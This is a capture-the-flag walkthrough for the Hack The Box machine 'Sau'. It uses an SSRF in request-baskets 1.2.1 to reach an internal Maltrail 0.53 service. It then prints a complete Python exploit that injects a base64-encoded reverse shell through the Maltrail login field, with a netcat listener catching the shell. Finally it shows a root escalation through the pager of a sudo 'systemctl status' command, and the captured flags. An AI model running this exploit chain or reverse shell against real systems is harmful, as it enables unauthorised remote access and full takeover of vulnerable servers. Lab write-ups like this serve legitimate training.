#  Sau Linux 
# https://app.hackthebox.com/machines/551
```bash
$ ping 10.129.229.26
PING 10.129.229.26 (10.129.229.26) 56(84) bytes of data.
64 bytes from 10.129.229.26: icmp_seq=1 ttl=63 time=65.7 ms
64 bytes from 10.129.229.26: icmp_seq=2 ttl=63 time=63.7 ms
^C
```

```bash
$ nmap -sC -sV 10.129.226.26 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 02:29 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.10 seconds


```

```bash
# Visit http://10.129.229.26:55555/

Powered by request-baskets | Version: 1.2.1

# Search request-baskets | Version: 1.2.1 and we found this vulnerability: https://github.com/entr0pie/CVE-2023-27163

# Create a basket(http://10.129.229.26:55555/web/efhoc4g) and go to settings of it.
 Forward URL: http://127.0.0.1:80/
Insecure TLS only affects forwarding to URLs like https://... true
Proxy Response: true
Expand Forward Path: true

# Now visit: http://10.129.229.26:55555/efhoc4g

# Now we can see the port 80!
```
```bash
# We see Powered by Maltrail (v0.53)

# We found well working reverse shell code from: https://medium.com/@dassomnath/sau-hack-the-box-write-up-7a34a6080fbf

#!/bin/python3

import sys
import os
import base64

# Arguments to be passed
YOUR_IP = sys.argv[1]  # <your ip>
YOUR_PORT = sys.argv[2]  # <your port>
TARGET_URL = sys.argv[3]  # <target url>

print("\n[+]Started MailTrail version 0.53 Exploit")

# Fail-safe for arguments
if len(sys.argv) != 4:
    print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
    sys.exit(-1)


# Exploit the vulnerbility
def exploit(my_ip, my_port, target_url):
    # Defining python3 reverse shell payload
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    # Encoding the payload with base64 encoding
    encoded_payload = base64.b64encode(payload.encode()).decode()
    # curl command that is to be executed on our system to exploit mailtrail
    command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    # Executing it
    os.system(command)


print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
try:
    exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
    print("\n[+] Successfully Exploited")
    print("\n[+] Check your Reverse Shell Listener")
except:
    print("\n[!] An Error has occured. Try again!")


nano exploit2.py
# Paste that code inside
```
```bash
$ python  exploit2.py 10.10.14.55 4444 http://10.129.229.26:55555/efhoc4g

[+]Started MailTrail version 0.53 Exploit

[+]Exploiting MailTrail on http://10.129.229.26:55555/efhoc4g


```
```bash
nc -nvlp 4444  
listening on [any] 4444 ...
connect to [10.10.14.55] from (UNKNOWN) [10.129.229.26] 47420
$ python3 -c "import pty;pty.spawn('/bin/bash')"                                               
python3 -c "import pty;pty.spawn('/bin/bash')"
puma@sau:/opt/maltrail$ ls
ls
CHANGELOG     core    maltrail-sensor.service  plugins           thirdparty
CITATION.cff  docker  maltrail-server.service  requirements.txt  trails
LICENSE       h       maltrail.conf            sensor.py
README.md     html    misc                     server.py
puma@sau:/opt/maltrail$ cd ..
cd ..
puma@sau:/opt$ cd ..
cd ..
puma@sau:/$ ls
ls
bin   data  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  vagrant
boot  dev   home  lib32  libx32  media       opt  root  sbin  sys  usr  var
puma@sau:/$ cd home
cd home
puma@sau:/home$ ls
ls
puma
puma@sau:/home$ cd puma
cd puma
puma@sau:~$ ls
ls
user.txt
puma@sau:~$ cat user.txt
cat user.txt
dbdb725e2d7ce6abdcf290893f33079d

```

```bash
puma@sau:~$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

# Our sudo capabilities only on status not edit.

# Visit: https://gtfobins.github.io/gtfobins/systemctl/

puma@sau:~$ find / -type f -name trail.service 2>/dev/null
find / -type f -name trail.service 2>/dev/null
/etc/systemd/system/trail.service
puma@sau:~$ ls -la /etc/systemd/system/trail.service
ls -la /etc/systemd/system/trail.service
-rwxr-xr-x 1 root root 461 Apr 15  2023 /etc/systemd/system/trail.service

# we see that we can't edit this, only root can edit it so we will use 3rd sudo.

puma@sau:~$ $ sudo /usr/bin/systemctl status trail.service 
$ sudo /usr/bin/systemctl status trail.service 
$: command not found
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh

# whoami
whoami
root
# dir                   
dir
user.txt
# cd ..
cd ..
# dir
dir
puma
# cd ..
cd ..
# dir
dir
bin   data  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  vagrant
boot  dev   home  lib32  libx32  media       opt  root  sbin  sys  usr  var
# cd root
cd root
# ls
ls
go  root.txt
# cat root.txt
cat root.txt
cbdff878d1c1e1da5d1bf173fc428f25

```
